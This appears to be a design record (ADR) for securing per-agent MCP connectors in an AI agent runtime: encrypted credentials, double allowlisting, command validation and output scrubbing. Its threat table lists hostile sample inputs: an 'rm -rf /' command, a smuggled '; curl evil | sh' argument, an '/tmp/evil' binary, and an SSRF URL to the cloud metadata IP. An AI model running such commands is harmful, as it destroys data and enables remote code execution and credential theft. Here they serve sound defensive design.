# ADR-033 — MCP Connector Credentials, Command Validation & Per-Agent Allowlist

- **Status:** PROPOSED
- **Date:** 2026-06-18
- **Slug:** `mcp-creds-and-allowlist`
- **Plan:** STAGE 2.5 — MCP Connector Layer (gap #29) — the security crux
- **Deciders:** architect, **owner (BOSS)**, **senior-security-engineer (HARD gate — BLOCKING; this ADR is their sign-off)**
- **Plugs into:** ADR-032 (connector registry + per-session composition — this ADR is its blocking security gate), ADR-021 (the AES broker reused verbatim), ADR-022 (argv-array spawn / allowlist discipline)

## Context

ADR-032 adds a per-agent MCP connector layer: the BOSS registers connectors, grants them to named agents, and at spawn `cliReply` (`agent-runtime/server.mjs` ~L477) composes a scoped `.mcp.json` containing exactly that agent's granted connectors, injected via `--mcp-config <path> --strict-mcp-config --allowedTools "mcp__<name>__*"`.

That layer introduces THREE new attack surfaces this ADR closes:

1. **Credential lifetime** — an MCP server (stdio `env`, http `headers`) may need a real secret. Where does the plaintext live, and for how long?
2. **Arbitrary execution** — a `stdio` connector's `command` becomes a child process `claude` launches. A malicious `command:"rm", args:["-rf","/"]` registered through the (authenticated) route is the core risk. Note the spawn is argv-array (no shell, no metachar word-splitting), but the COMMAND ITSELF executing is the danger, not shell injection.
3. **Cross-agent leakage** — an ungranted agent must not be able to load or call a connector, and must not pick one up from the host's global MCP config.

**KEY PROVEN FACT (spike, `claude` v2.1.140):** `--strict-mcp-config` makes claude load ONLY the servers in the injected config, ignoring all global/user `.mcp.json` + settings; unlisted `mcp__*` tools are auto-denied in `-p`. This is the claude-layer half of the double allowlist.

BOSS decisions (locked): subscription `cli` only, Claude only, **reuse the existing AES credential broker in `factory.mjs` — do NOT invent a new secret store**, reuse the proven loop/broker/guards untouched. This ADR is the senior-security-engineer's HARD, BLOCKING sign-off; ADR-032 does not ship until it passes.

## Decision

### 0. Scope — REUSED vs ADDED

```
REUSED  : AES-256-GCM broker (factory.mjs encrypt L416 / decrypt L423 / brokerKey L399)  — verbatim; no new store
REUSED  : connectAccount-style ingress (factory.mjs L442) — raw secret encrypted at ingress, never logged (L451 audit logs NO secret)
REUSED  : decrypt-only-at-use pattern (factory.mjs executePost L567 — decrypt → use → never return/log/stream)
REUSED  : RUNTIME_DIR = $TMPDIR/missionalpha-runtime (factory.mjs L57) — creds + scoped config OUTSIDE the repo/worktree
REUSED  : 0o600 file mode (factory.mjs saveConnections L434; broker key L413)
REUSED  : --strict-mcp-config (PROVEN) — claude-layer allowlist enforcer
REUSED  : argv-array spawn, no shell:true (server.mjs L515) — MCP flags appended here (ADR-022 discipline)
REUSED  : scrub() egress filter (server.mjs L333) + factory.scrubExt (L46) + RUNTIME_TOKEN redaction (L337)
ADDED   : mcp-cred ingress route — reuses the broker; stores a credId reference in the connector record (ADR-032 §1)
ADDED   : command/url/header validators (this ADR §3) — the choke point before any connector record is written
ADDED   : decryptForCompose(credId) — broker decrypt called ONLY at the spawn frame (ADR-032 §4 step 2)
ADDED   : per-spawn secret-value scrub registration — connector secrets added to the scrub set for the turn
```

### 1. Credentials — reuse the AES broker, decrypt only at the spawn frame

- **Ingress (encrypt immediately).** A connector secret enters ONLY via an authenticated cred-add route (loopback + `tokenOk` + `originOk`, same gate as `/factory/connect` L1093). The raw value is handed straight to the broker's `encrypt()` (factory.mjs L416) and stored under a server-minted `credId` (the existing `conn_<hex>` shape, L448). It is **never** returned, logged (audit logs metadata only, L451 pattern), put in an agent's read scope, or echoed. The connector record (ADR-032 §1) stores only the `credId` reference in `headersRef`/`envRefs` — never a value.
- **Decrypt only at the spawn frame.** `composeMcp(agentId)` (ADR-032 §4) is the ONLY caller of `decryptForCompose(credId)` (a thin wrapper over the broker's internal `decrypt()` L423). Decryption happens at the moment of composing the scoped `.mcp.json` — mirroring `executePost` (L567: decrypt → use immediately → never return). The plaintext exists only:
  1. in the in-memory config object being serialized, and
  2. in the scoped `.mcp.json` file on disk, briefly.
- **Scoped config placement + lifetime.** Written to `RUNTIME_DIR/mcp/<agentId>-<spawnNonce>.json`, mode **`0o600`**, **OUTSIDE any agent-readable dir.** The agent's Read tool is scoped to its worktree via `--add-dir` (server.mjs L501); `$TMPDIR/missionalpha-runtime` is not in that scope (same placement reasoning as the runtime token L99-107 and broker creds factory.mjs L55-58 — "no agent read-scope can reach them"). **Deleted after spawn** (`child.on("close")` unlink, or immediately once claude has consumed it at init). Short-lived, never committed (gitignored), never SSE'd.
- **Never the child env.** stdio `env` secrets go into the `.mcp.json` `env` map (PROVEN spike shape), NOT `childEnv` (L510-514) — which deliberately strips secret-shaped vars. This keeps the secret out of the child's process environment.

### 2. Per-agent allowlist — enforced TWICE

1. **Our grant gate (ADR-032 §3).** `grantsFor(agentId)` decides which connectors are composed into the scoped config. Default-deny: an agent with no grant entry gets an empty list → `composeMcp` returns null → **no `--mcp-config`, no MCP servers, no `mcp__*` tools allowlisted.** The connector is simply absent from that agent's config — it literally cannot be named in a tool call.
2. **`--strict-mcp-config` (claude layer, PROVEN).** For a granted agent, claude loads ONLY the servers in the injected `scopedPath`, **ignoring all global/user `.mcp.json` + settings.** So even if the host has a global MCP config, an ungranted agent picks up NOTHING from it (it gets no `--mcp-config`/`--strict-mcp-config` at all and has no `mcp__*` tool allowlisted; a granted agent gets ONLY its own composed servers). `--allowedTools "mcp__<name>__*"` is added once per composed server; unlisted MCP tools are auto-denied in `-p`.

**Confirmed:** an ungranted agent gets NO connector AND NO host/global MCP. A granted agent gets EXACTLY its composed set, nothing wider.

### 3. Injection guards — operator-supplied config is validated before write (the arbitrary-exec choke point)

`command`/`args`/`url`/`headersRef`/`envRefs` arrive via the authenticated `addConnector`/`updateConnector` route (ADR-032 §6). Authenticated ≠ trusted-shape — validate before any record is written:

- **`command` allowlist (stdio).** `command` MUST be one of a closed launcher allowlist — `npx`, `node`, `uvx`, `python`/`python3`, `docker`, `bunx` (the known MCP launchers). Anything else → HTTP 400. Rationale: the command becomes a child process claude launches; `rm`, `bash`, `sh`, `curl`, an absolute path to an arbitrary binary are rejected at the route — they never reach a record, never reach a spawn. The allowlist is a frozen server-side const (ADR-022 §1 pattern, `Object.freeze` + `hasOwnProperty`).
- **`command`/`args` safe-shape.** No shell metacharacters or control chars in `command` or any `args` element (`[\x00-\x1f\x7f;&|`$()<>]` rejected) — defense in depth even though `spawn` is argv-array (no shell). No newline injection into the JSON (values are data, but must be sane: bounded length, no control chars — reuse the `clean()` discipline factory.mjs L96).
- **`url` (http).** MUST be `https://` (reject `http`, `file`, `ftp`, etc.). Optional host allowlist (operator-configurable; if set, the URL host MUST match). No credentials embedded in the URL.
- **header/env names.** `headersRef`/`envRefs` KEYS must match `[A-Za-z0-9_-]+` (header) / `[A-Za-z0-9_]+` (env); a malformed name is rejected. VALUES in these maps are `credId` references (ADR-032 §1), validated to point at an existing broker cred.
- **`name`.** `[a-z0-9_-]{2,48}` (ADR-032 §2) — it becomes the `mcp__<name>__*` allowlist prefix; a bad name would mis-scope `--allowedTools`.

These validators are the registry store's write-time choke point (ADR-032 §2). A connector that fails any check is a 400 — no record, no grant, no spawn.

### 4. Egress scrub extended to MCP

- The connector secret VALUES decrypted at the spawn frame are registered into the turn's scrub set (alongside the existing `RUNTIME_TOKEN` redaction, server.mjs L337) so even if a tool result or model echo contains a secret, SSE redacts it (`scrub()` L333 + `factory.scrubExt` L46). The existing `SECRET_RE`/`SECRET_RE_EXT` already catch bearer/oauth/JWT/access_token shapes; this adds the EXACT decrypted value as a literal-string redaction (like `RUNTIME_TOKEN` L337) for non-standard-shaped secrets.
- **Note (current streaming reality):** `cliReply` streams only `content_block_delta` text + the `result.result` fallback (L540-554); MCP `tool_use`/`tool_result` events are NOT streamed as text today. But a `result` summary could echo a secret returned by a tool → the per-turn scrub set covers it. The literal-value scrub is registered for the turn's duration and cleared after `done` (no secret lingers in a long-lived set).

### 5. HARD sign-off conditions (BLOCKING — senior-security-engineer)

All five must hold before ADR-032 composes a connector into any real spawn:

- **(a) No plaintext cred in logs / SSE / registry record.** Secret only in the broker (encrypted) + the brief `0o600` scoped file + the compose frame. Audit + registry store references only.
- **(b) Decrypt only at the spawn frame; scoped config `0o600`, outside the worktree, removed after spawn.** `decryptForCompose` has exactly one caller (`composeMcp`); file under `RUNTIME_DIR/mcp/`, unlinked post-spawn.
- **(c) Ungranted agent cannot load OR call the connector — BOTH layers.** Grant gate omits it from the config (it's absent) AND `--strict-mcp-config` blocks any global/host MCP. Verified: ungranted agent gets zero MCP.
- **(d) Connector command validated — no arbitrary-exec via a crafted connector.** `command` ∈ frozen launcher allowlist; metachar/control-char shape check; `url` https-only. A `command:"rm"` connector is a 400 at the route.
- **(e) Reuse the AES broker — no new secret store.** `encrypt`/`decrypt`/`brokerKey` (factory.mjs L399-428) used verbatim; no second key, no second store.

## Security invariant (attack → mitigation)

**INVARIANT: a connector secret is never plaintext anywhere an agent or the wire can reach it; an ungranted agent can neither load nor call a connector; and a crafted connector cannot execute an arbitrary command.**

| Attack | Vector | Mitigation |
|---|---|---|
| Arbitrary exec via connector | `command:"rm", args:["-rf","/"]` | command NOT on frozen launcher allowlist → 400 at route; never written, never spawned (§3 (d)) |
| Shell metachar injection | `args:["; curl evil \| sh"]` | metachar/control-char shape reject → 400; spawn is argv-array no-shell anyway (§3) |
| Binary smuggling | `command:"/tmp/evil"` | absolute path / non-launcher → not on allowlist → 400 (§3) |
| Cred exfil via ungranted agent | agent not granted tries `mcp__fsdata__read_file` | not in grant map → absent from config; `--strict-mcp-config` → tool auto-denied (§2) |
| Global-MCP pickup | host has a global `.mcp.json` with a powerful server | `--strict-mcp-config` ignores ALL global/user config (PROVEN); ungranted agent gets no `--mcp-config` (§2) |
| Cred in agent read scope | agent Reads its own injected config | scoped file under `$TMPDIR/missionalpha-runtime`, OUTSIDE `--add-dir` worktree, `0o600` (§1 (b)) |
| Cred persisted | secret lands in a committed/long-lived file | broker AES-encrypted store + brief `0o600` scoped file deleted post-spawn; both gitignored, outside repo (§1) |
| Cred in logs / audit | secret written to factory-audit.log | audit logs metadata only (factory.mjs L451 pattern); no secret param (§1, (a)) |
| Cred echoed over SSE | tool result / model echoes the secret | per-turn literal-value scrub + `scrub`/`scrubExt` shapes (L333/L46/L337) redact it (§4) |
| Cred in child env | env-shaped secret leaks via process env | env secrets go in `.mcp.json` `env` map (PROVEN), NOT `childEnv` which strips secret-shaped vars (L510-514) (§1) |
| SSRF via http connector | `url:"http://169.254.169.254/..."` | https-only + optional host allowlist; no `http`/`file`/metadata-IP via plain http (§3) |
| Registry widening at runtime | mutate the launcher allowlist | `Object.freeze` + `hasOwnProperty` (ADR-022 §1 pattern) (§3) |

## Consequences

**Positive** — connector secrets get the SAME proven posture as platform creds (ADR-021): AES-256-GCM, tmp-dir, never-logged, decrypt-at-use, no new store; double allowlist (grant gate + `--strict-mcp-config`) makes cross-agent leakage structurally impossible; the command allowlist closes the arbitrary-exec hole that the connector layer would otherwise open; egress scrub already exists and is extended, not reinvented.

**Negative / accepted** — the launcher allowlist must be maintained as new MCP server runtimes appear (a deliberate one-line add, like ADR-022's 4th tier); a brief `0o600` plaintext file exists during compose (mitigated: outside worktree, deleted post-spawn, gitignored); the operator can register a working-but-useless connector if they fat-finger args (a config error, not a security hole — health surfaces it, ADR-032 §5); a determined operator with the runtime token is already trusted (the threat model is agent/wire exfil + crafted-connector exec, not a malicious authenticated operator — same boundary as `/apply`).

**Observability** — `connector.add`/`connector.grant`/`connector.compose`/`connector.health` audit events (factory.mjs L607 pattern) record metadata only (connectorId, name, agentId, transport) — NEVER refs/values; a `connector.validate.reject` audit on a 400 (command/url failure) gives a tamper signal.

## Alternatives rejected

1. **New dedicated MCP secret store** — violates the BOSS decision; the factory.mjs broker (ADR-021) already does exactly this (AES-256-GCM, tmp-dir, never-logged). Reuse, don't reinvent.
2. **Keep the scoped `.mcp.json` inside the worktree for simplicity** — the agent's Read tool would reach its own injected creds. Non-starter; placement OUTSIDE the worktree is the whole point (§1 (b)).
3. **No command allowlist, rely on argv-array spawn** — argv-array stops SHELL injection, not the command ITSELF executing. `command:"rm"` is a valid argv-array spawn. The allowlist is mandatory (§3 (d)).
4. **Decrypt at registry-add and cache plaintext** — widens the plaintext window from a spawn frame to a process lifetime. Decrypt-at-use (like `executePost` L567) keeps the window minimal.
5. **Trust `--strict-mcp-config` alone (skip the grant gate)** — single layer; a bug in flag construction would expose everything in the registry. Defense-in-depth: grant gate decides the SET, strict flag enforces it at claude (§2).
6. **Env-var injection for stdio secrets** — fights the existing `childEnv` secret-strip (L510-514) and broadens the child's secret surface; the spike proved the `.mcp.json` `env` map is the correct channel (§1).
